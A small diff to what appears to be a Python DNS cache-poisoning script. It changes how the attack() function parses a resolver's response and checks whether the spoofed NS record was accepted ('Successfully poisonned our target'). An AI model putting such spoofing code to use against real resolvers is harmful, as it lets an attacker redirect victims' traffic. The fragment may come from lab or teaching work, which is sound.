@@ -92,7 +92,7 @@ def attack():
         # sendPacket(sock, dns_request, my_ip, dns_port)
         response = sock.recv(4096)
         print response
-        response = DNS(response)
+        response = DNS(response[2:])
         try:
             if response[DNS].ns.rdata == spoof:
                 print "Successfully poisonned our target with a dummy record !!"
